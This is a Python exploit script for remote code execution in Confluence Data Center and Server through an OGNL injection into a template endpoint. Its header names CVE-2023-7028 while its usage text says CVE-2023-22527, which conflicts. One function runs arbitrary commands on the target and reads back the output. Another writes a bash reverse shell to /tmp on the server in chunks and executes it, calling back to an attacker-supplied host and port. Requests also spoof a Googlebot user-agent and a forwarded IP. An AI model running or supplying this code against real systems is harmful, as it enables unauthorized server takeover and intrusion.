# Author: Thanh Lam
# Description: CVE-2023-7028 - RCE (Remote Code Execution) Vulnerability In Confluence Data Center and Confluence Server
# Affected Versions:
#     8.0.x
#     8.1.x
#     8.2.x
#     8.3.x
#     8.4.x
#     8.5.0-8.5.3

import argparse
import urllib
from urllib.parse import urlencode
import requests


def truncate(s, size=3):
    if isinstance(s, str):
        length = len(s)
        chunks = [s[i:i + size] for i in range(0, length, size)]
        # Patch
        for i in range(len(chunks)):
            if chunks[i][-1] == '%' and i < len(chunks) - 1:
                chunks[i] += s[length - 1:length + 1]
            elif chunks[i][-2] == '%' and i < len(chunks) - 1:
                chunks[i] += s[length - 1]
        return chunks


def RCE(hostname):
    cmd = input("Command: ")
    headers = {
        'Host': f'{hostname}',
        'User-Agent': "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
                      "+http://www.google.com/bot.html) Chrome/114.0.5735.13 Safari/537.36)",
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '286',
        'X-Forwarded-For': '10.10.10.17'
    }
    print("[PROCESS] Sendingg payload!")
    response = requests.post(f"http://{hostname}//template/aui/text-inline.vm",
                             headers=headers,
                             data="label=aaa\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet("
                                  "\\u0027ognl\\u0027).findValue(#parameters.poc[0],"
                                  "{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader("
                                  "'Cmd-Ret',(new+freemarker.template.utility.Execute()).exec({" + f"'{cmd}'" + "}))",
                             verify=False
                             )
    print("----------------- Result -----------------")
    print(response.headers.get('Cmd-Ret'))


def Reverse_Shell(hostname, host, port):
    cmd = f"/bin/bash -i >& /dev/tcp/{host}/{port} 0>&1"
    proxy = {'http': '127.0.0.1:8081'}
    filename = "/tmp/a"
    cmd_encode = urllib.parse.quote(cmd)
    print(cmd_encode)
    payload = truncate(cmd_encode, size=31)
    headers = {
        'Host': f'{hostname}',
        'User-Agent': "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
                      "+http://www.google.com/bot.html) Chrome/114.0.5735.13 Safari/537.36)",
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '286',
        'X-Forwarded-For': '10.10.10.17'
    }

    print(f"[PROCESS] Creating file {filename}...!")
    response = requests.post(f"http://{hostname}/template/aui/text-inline.vm",
                             headers=headers,
                             data="label=aaa\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet("
                                  "\\u0027ognl\\u0027).findValue(#parameters.poc[0],"
                                  "{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader("
                                  f"'Cmd-Ret',(new+java.io.PrintWriter(new+java.io.FileWriter('{filename}',false))).printf('','').checkError())",
                             verify=False
                             )

    for thanh in payload:
        print(f"[PROCESS] Writing {thanh} to file...!")
        response = requests.post(f"http://{hostname}/template/aui/text-inline.vm",
                                 headers=headers,
                                 data="label=aaa\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet("
                                      "\\u0027ognl\\u0027).findValue(#parameters.poc[0],"
                                      "{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader("
                                      f"'Cmd-Ret',(new+java.io.PrintWriter(new+java.io.FileWriter('{filename}',true))).printf('{thanh}','').checkError())",
                                 verify=False
                                 )

    print("[PROCESS] Excuting payload...!")
    response = requests.post(f"http://{hostname}/template/aui/text-inline.vm",
                             headers=headers,
                             data="label=aaa\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet("
                                  "\\u0027ognl\\u0027).findValue(#parameters.poc[0],"
                                  "{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader("
                                  "'Cmd-Ret',(new+freemarker.template.utility.Execute()).exec({" + f"'bash {filename}'" + "}))",
                             verify=False
                             )
    print("----------------- Result -----------------")
    print(response.headers.get('Cmd-Ret'))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True,
                                     description='Tool exploit CVE-2023-22527 on Confluence',
                                     usage="python3 CVE-2023-22527 -u ip:port -lh ip -lp port (without http://)"
                                     )
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-lh", "--host", required=True, help="Public IP/Domain")
    parser.add_argument("-lp", "--port", required=True, help="Listen Port")
    args = parser.parse_args()
    url = args.url
    host = args.host
    port = args.port
    Reverse_Shell(url, host, port)
    # If U don't want catch reverse shell, comment above line and use following
    # RCE(hostname)
